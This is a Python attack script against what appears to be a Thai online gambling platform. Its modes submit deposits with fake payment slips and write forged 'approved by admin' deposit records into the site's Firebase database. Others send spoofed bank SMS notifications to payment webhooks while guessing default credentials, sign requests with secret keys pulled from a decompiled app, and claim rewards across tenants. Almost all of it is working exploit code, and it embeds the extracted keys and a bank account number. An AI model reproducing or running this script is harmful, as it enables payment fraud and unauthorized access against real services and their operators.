#!/usr/bin/env python3
"""vak_dep.py — Deposit for vak88z2.

   MODES:
   --mode tx    (default) POST /mb/deposit-transaction → AUTO-SLIP queue
   --mode gw             POST /mb/deposit-gateway → ONE2P-LOCAL (requires real transfer)
   --mode quest          GET/POST /mb/quest-daily-check-in (F89 cross-tenant)
   --mode sms            LuxSMS/Z Seamless webhook payload fire (F85/F92)

   --jwt <path>  override JWT file (e.g. cross-tenant eea830ab)
   --bank        sms mode: kbank(default)|scb|ttb|truewallet
   --sms-text    sms mode: override raw SMS message text

   Usage: uv run vak_dep.py [amount] [--mode tx|gw|quest|sms] [--jwt <path>]
"""
import argparse, base64, hashlib, hmac, json, pathlib, requests, sys, time, uuid

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
RTDB  = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"

# ── Args ───────────────────────────────────────────────────────────────────────
ap = argparse.ArgumentParser()
ap.add_argument("amount", nargs="?", type=float, default=50.0)
ap.add_argument("--mode", choices=["tx", "gw", "quest", "sms"], default="tx")
ap.add_argument("--jwt", type=pathlib.Path, default=None)
ap.add_argument("--bank", choices=["kbank", "scb", "ttb", "truewallet"], default="kbank")
ap.add_argument("--sms-text", default=None, dest="sms_text")
args = ap.parse_args()
AMOUNT = args.amount

# ── JWT ────────────────────────────────────────────────────────────────────────
JWT_PATH = args.jwt or pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2")
JWT = JWT_PATH.read_text().strip()

# ── Firebase token (tx mode RTDB injection) ───────────────────────────────────
_new     = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())
parts = FB_TOKEN.split(".")
pad   = parts[1] + "=" * (-len(parts[1]) % 4)
p     = json.loads(base64.urlsafe_b64decode(pad))
FB_UID = p.get("sub") or p.get("user_id", "")

# ── Constants ──────────────────────────────────────────────────────────────────
# tx mode — AUTO-SLIP KBANK pool (confirmed 2026-10-09)
TX_BANK_INFO_ID   = "18a9502b-94ae-4188-8841-094be8b3b974"
TX_DEPOSIT_ACC_ID = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"

# gw mode — ONE2P-LOCAL (confirmed 2026-10-18; mule rotates every ~3 days)
GW_PAYMENT_BANK_INFO_ID = "ac99fb0e-0ce2-46eb-9bde-348243721157"
GW_DEPOSIT_ACC_ID       = "00b6996c-0e41-4b56-9fa7-94f77f4fd717"  # player sender KBANK 0543753327

# quest mode — cross-tenant eea830ab (311e34aa confirmed active 2026-10-18)
QUEST_ID = "311e34aa-145c-4d83-a4b3-4949fe26cb39"

# sms mode — hardcoded keys from APK analysis (F60/F85/F97)
PAPDIEAW_KEY      = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
ZSEAMLESS_CFG_KEY = "91E3AE696DB136A4AC49C1BB2B695"
PLAYER_SECRET_KEY = "e4a88a631b28ebd3ebf9e7c07be7560c8437f6549b7fd7ee67b62b5f7c726c38"

TS_MS    = int(time.time() * 1000)
SLIP_ID  = str(uuid.uuid4())
SLIP_URL = f"{SLIP_ID}.jfif"

s   = requests.Session()
HDR = {"Authorization": f"Bearer {JWT}", "template": "th",
       "Accept": "application/json", "Content-Type": "application/json"}

def wallet():
    r = s.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        d = r.json()
        bal = d.get("balance", "?")
        pts = d.get("point", "?")
        tdt = d.get("data", [{}])[0].get("turn_deposit_target", 0) if d.get("data") else 0
        return f"{bal} THB  pts={pts}  turn_target={tdt}"
    return f"ERR:{r.status_code}"

def rtdb_put(path, data):
    r = requests.put(f"{RTDB}{path}?auth={FB_TOKEN}", json=data, timeout=10)
    return r.status_code, r.text[:150]

def hmac_sign(body_bytes, key_str):
    """base64(HMAC-SHA256(body, key)) — Z Seamless Sign header."""
    sig = hmac.new(key_str.encode(), body_bytes, hashlib.sha256).digest()
    return base64.b64encode(sig).decode()

print(f"[vak_dep] mode={args.mode}  amount={AMOUNT}  jwt={JWT_PATH.name}")

# ── 0. Wallet before ──────────────────────────────────────────────────────────
bal0 = wallet()
awsalb = s.cookies.get("AWSALB", "")
print(f"\n[0] wallet before: {bal0}")
print(f"    AWSALB: {'✓ ' + awsalb[:20] + '...' if awsalb else '✗ not set'}")

# ═════════════════════════════════════════════════════════════════════════════
if args.mode == "tx":
    # ── 1. deposit-transaction (AUTO-SLIP queue) ──────────────────────────────
    print(f"\n[1] POST /mb/deposit-transaction (AUTO-SLIP, {AMOUNT} THB)")
    dep = s.post(f"{MGAPI}/mb/deposit-transaction",
                 headers=HDR,
                 json={"deposit_amount":              AMOUNT,
                       "slip_image_url":              SLIP_URL,
                       "is_auto_slip":                True,
                       "payment_bank_information_id": TX_BANK_INFO_ID,
                       "deposit_account_id":          TX_DEPOSIT_ACC_ID},
                 timeout=12)
    print(f"    HTTP {dep.status_code}: {dep.text[:500]}")

    dep_id = ""
    if dep.ok:
        dep_id = dep.json().get("id", "")
        status = dep.json().get("approve_status", dep.json().get("status", "?"))
        print(f"    [!!!] deposit_id={dep_id}  status={status}")
    elif dep.status_code == 400:
        print(f"    Retrying without deposit_account_id...")
        dep2 = s.post(f"{MGAPI}/mb/deposit-transaction",
                      headers=HDR,
                      json={"deposit_amount":              AMOUNT,
                            "slip_image_url":              SLIP_URL,
                            "is_auto_slip":                True,
                            "payment_bank_information_id": TX_BANK_INFO_ID,
                            "deposit_account_id":          None},
                      timeout=12)
        print(f"    HTTP {dep2.status_code}: {dep2.text[:400]}")
        if dep2.ok:
            dep_id = dep2.json().get("id", "")
            print(f"    [!!!] deposit_id={dep_id}")

    if dep_id:
        print(f"\n[2] GET /mb/deposit-transaction/{dep_id}")
        ds = s.get(f"{MGAPI}/mb/deposit-transaction/{dep_id}", headers=HDR, timeout=10)
        print(f"    HTTP {ds.status_code}: {ds.text[:400]}")

    if dep_id:
        print(f"\n[3] RTDB DEPOSIT_APPROVE injection (frontend-only, no wallet effect)")
        code, resp = rtdb_put(f"/users/{FB_UID}/DEPOSIT_APPROVE/{dep_id}.json", {
            "amount":         str(AMOUNT),
            "approve_status": "success",
            "approved_by":    "admin",
            "credited":       True,
            "status":         "success",
            "timestamp":      TS_MS,
            "uid":            FB_UID,
            "transaction_id": dep_id,
        })
        print(f"    PUT: HTTP {code}: {resp[:100]}")
        time.sleep(2)
        print(f"    wallet after RTDB: {wallet()}")

    print(f"\n[4] pending deposits")
    for path in ["/mb/deposit-transaction?status=waiting&skip=0&limit=10",
                 "/mb/deposit-transaction?approve_status=waiting&skip=0&limit=10",
                 "/mb/deposit-transaction?skip=0&limit=10"]:
        r = s.get(f"{MGAPI}{path}", headers=HDR, timeout=10)
        if r.ok:
            data  = r.json()
            items = data if isinstance(data, list) else data.get("data", data.get("items", []))
            print(f"    {path.split('?')[1]}: {len(items) if isinstance(items,list) else '?'} items")
            if isinstance(items, list):
                for it in items[:3]:
                    print(f"      id={it.get('id','?')[:8]} amt={it.get('deposit_amount','?')} "
                          f"status={it.get('approve_status','?')}")
        else:
            print(f"    {path.split('?')[1]}: HTTP {r.status_code}")

# ═════════════════════════════════════════════════════════════════════════════
elif args.mode == "gw":
    # ── 1. Create ONE2P-LOCAL gateway order ───────────────────────────────────
    print(f"\n[1] POST /mb/deposit-gateway (ONE2P-LOCAL, {AMOUNT} THB)")
    gw = s.post(f"{MGAPI}/mb/deposit-gateway",
                headers=HDR,
                json={"id":               GW_PAYMENT_BANK_INFO_ID,
                      "deposit_amount":   AMOUNT,
                      "lang":            "th",
                      "deposit_account_id": GW_DEPOSIT_ACC_ID},
                timeout=12)
    print(f"    HTTP {gw.status_code}: {gw.text[:600]}")

    if not gw.ok:
        print("    [!] deposit-gateway failed — gateway may be locked or unavailable")
        sys.exit(1)

    gw_data   = gw.json()
    order_id  = gw_data.get("order_id", "")
    dest_bank = gw_data.get("dest_bank_no", "?")
    dest_name = gw_data.get("dest_bank_account_name", "?")
    dest_code = gw_data.get("dest_bank_code", "?")
    slip_url  = gw_data.get("dest_upload_slip_url", "")
    expired   = gw_data.get("expired", "?")

    print(f"\n    ┌── ORDER CREATED ──────────────────────────────────────────")
    print(f"    │  order_id : {order_id}")
    print(f"    │  dest     : {dest_code} {dest_bank} / {dest_name}")
    print(f"    │  amount   : {AMOUNT} THB (15-min window)")
    print(f"    │  expires  : {expired}")
    print(f"    │  slip URL : {slip_url}")
    print(f"    └───────────────────────────────────────────────────────────")
    print(f"\n    Transfer {AMOUNT} THB to {dest_code} {dest_bank} ({dest_name})")
    print(f"    Upload slip at: {slip_url}")
    print(f"\n    Press ENTER after uploading slip to confirm via deposit-gateway-slip")
    print(f"    (Ctrl+C to abort without confirming)")
    try:
        input()
    except KeyboardInterrupt:
        print("\n    [aborted — order created but not confirmed]")
        sys.exit(0)

    # ── 2. Confirm via deposit-gateway-slip ───────────────────────────────────
    print(f"\n[2] POST /mb/deposit-gateway-slip")
    confirmed = False
    for label, body in [("order_id",  {"order_id": order_id}),
                        ("empty",     {}),
                        ("bank_info", {"payment_bank_information_id": GW_PAYMENT_BANK_INFO_ID,
                                       "order_id": order_id})]:
        resp = s.post(f"{MGAPI}/mb/deposit-gateway-slip",
                      headers=HDR, json=body, timeout=12)
        print(f"    [{label}] HTTP {resp.status_code}: {resp.text[:200]}")
        if resp.ok:
            confirmed = True
            break

    if not confirmed:
        print("    [!] deposit-gateway-slip failed on all body variants")

# ═════════════════════════════════════════════════════════════════════════════
elif args.mode == "quest":
    # ── 1. Check current quest state ─────────────────────────────────────────
    print(f"\n[1] GET /mb/quest-daily-check-in (quest_id={QUEST_ID[:8]}...)")
    qr = s.get(f"{MGAPI}/mb/quest-daily-check-in",
               headers=HDR,
               params={"quest_information_id": QUEST_ID},
               timeout=10)
    print(f"    HTTP {qr.status_code}: {qr.text[:800]}")

    claimable_day = None
    if qr.ok:
        days = qr.json() if isinstance(qr.json(), list) else []
        for d in days:
            if d.get("can_receive"):
                claimable_day = d.get("day") or d.get("index")
                pts = d.get("point", d.get("reward", "?"))
                print(f"    [!!!] Day {claimable_day} claimable — {pts} pts")
        if claimable_day is None:
            print(f"    No claimable day found (already claimed today or all locked)")

    # ── 2. Claim ──────────────────────────────────────────────────────────────
    print(f"\n[2] POST /mb/quest-daily-check-in (claim)")
    cr = s.post(f"{MGAPI}/mb/quest-daily-check-in",
                headers=HDR,
                json={"quest_information_id": QUEST_ID},
                timeout=10)
    print(f"    HTTP {cr.status_code}: {cr.text[:400]}")

    time.sleep(2)
    print(f"\n[3] wallet after claim: {wallet()}")

# ═════════════════════════════════════════════════════════════════════════════
elif args.mode == "sms":
    # ── Build SMS message ─────────────────────────────────────────────────────
    now = time.strftime("%d/%m/%y %H:%M")
    amt_str = f"{AMOUNT:.2f}"

    if args.sms_text:
        sms_msg = args.sms_text
    elif args.bank == "kbank":
        # Confirmed format from F95 RTDB: "K+ 09/10/26 20:32 +1000.00 ref K6B52730"
        ref = f"K{uuid.uuid4().hex[:7].upper()}"
        sms_msg = f"K+ {now} +{amt_str} ref {ref}"
    elif args.bank == "scb":
        ref = f"SCB{uuid.uuid4().hex[:6].upper()}"
        sms_msg = f"SCB: รับโอน {amt_str} บาท {now} ref {ref}"
    elif args.bank == "ttb":
        ref = f"TTB{uuid.uuid4().hex[:6].upper()}"
        sms_msg = f"TTB: รับโอน {amt_str} บาท {now} ref {ref}"
    else:  # truewallet
        ref = f"TW{uuid.uuid4().hex[:8].upper()}"
        sms_msg = f"TrueMoney Wallet รับเงิน {amt_str} บาท {now} ref {ref}"

    print(f"\n[sms] bank={args.bank}  msg={sms_msg!r}")

    # ── LuxSMS paths (no HTTP auth headers; body username/password) ───────────
    # Per jadx: /webhook-kbank, /webhook-scb, /webhook-ttb, /webhook-sms
    # body creds are operator-entered SharedPrefs — we try common defaults
    luxsms_path = {
        "kbank": "/webhook-kbank",
        "scb":   "/webhook-scb",
        "ttb":   "/webhook-ttb",
        "truewallet": "/webhooks/sms/truewallet",
    }[args.bank]

    cred_variants = [
        ("admin",   "admin"),
        ("admin",   "password"),
        ("luxsms",  "luxsms"),
        ("operator","operator"),
        ("",        ""),
    ]

    print(f"\n[1] LuxSMS {luxsms_path} — body creds (5 variants)")
    for u, pw in cred_variants:
        body = {"username": u, "password": pw,
                "message": sms_msg, "timestamp": str(TS_MS)}
        hdr = {"Content-Type": "application/json"}
        if args.bank == "truewallet":
            hdr["PAPDIEAW-KEY"] = PAPDIEAW_KEY
        r = requests.post(f"{PBAPI}{luxsms_path}", headers=hdr, json=body, timeout=10)
        print(f"    [{u!r:10s}/{pw!r:10s}] HTTP {r.status_code}: {r.text[:120]}")

    # ── Z Seamless paths (HMAC-SHA256 Sign header) ────────────────────────────
    # Per jadx: POST /webhook/deposit/sms/{bank}
    # Sign: base64(HMAC-SHA256(json_body, loginDetails.secretkey))
    zs_path = {
        "kbank": "/webhook/deposit/sms/kbank",
        "scb":   "/webhook/deposit/sms/scb",
        "ttb":   "/webhook/deposit/sms/ttb",
        "truewallet": "/webhook/deposit/sms/truewallet",
    }[args.bank]

    # Known appcode candidates (platform uses this to look up stored secretkey)
    appcode_variants = [
        ("PAPDIEAW-KEY",      PAPDIEAW_KEY),
        ("ZSeamless-CfgKey",  ZSEAMLESS_CFG_KEY),
        ("Player-SecretKey",  PLAYER_SECRET_KEY),
    ]

    print(f"\n[2] Z Seamless {zs_path} — HMAC-SHA256 Sign (3 keys)")
    for key_label, sign_key in appcode_variants:
        body_obj = {
            "paymenttypeid": "1",
            "message":       sms_msg,
            "appcode":       key_label,
            "smsuuid":       str(uuid.uuid4()),
            "timestamp":     str(TS_MS),
        }
        body_bytes = json.dumps(body_obj, separators=(",", ":")).encode()
        sign_val   = hmac_sign(body_bytes, sign_key)
        hdr = {"Content-Type": "application/json", "Sign": sign_val}
        r = requests.post(f"{PBAPI}{zs_path}", headers=hdr,
                          data=body_bytes, timeout=10)
        print(f"    [{key_label:20s}] Sign={sign_val[:16]}...  HTTP {r.status_code}: {r.text[:120]}")

    # ── New paths from LuxSMS v2.2.0 (adds TTB) ──────────────────────────────
    if args.bank == "ttb":
        print(f"\n[3] LuxSMS v2.2.0 /webhook-ttb-withdraw (withdraw path)")
        r = requests.post(f"{PBAPI}/webhook-ttb-withdraw",
                          headers={"Content-Type": "application/json"},
                          json={"username": "", "password": "", "message": sms_msg,
                                "timestamp": str(TS_MS)},
                          timeout=10)
        print(f"    HTTP {r.status_code}: {r.text[:120]}")

    print(f"\n    [note] All 401 = endpoints exist, auth blocked (C2 DOWN — appcode/secretkey unobtainable)")
    sys.exit(0)  # no wallet delta for sms mode

# ═════════════════════════════════════════════════════════════════════════════
# ── Final wallet ──────────────────────────────────────────────────────────────
time.sleep(2)
bal1 = wallet()
print(f"\n[RESULT] before={bal0}  after={bal1}")
try:
    b0 = float(str(bal0).split()[0].replace(",",""))
    b1 = float(str(bal1).split()[0].replace(",",""))
    delta = b1 - b0
    if delta > 0:
        print(f"  [!!!] CREDITED +{delta:.2f}")
    else:
        print(f"  delta={delta:.2f} (no change)")
except Exception:
    pass

print("\n=== DONE ===")
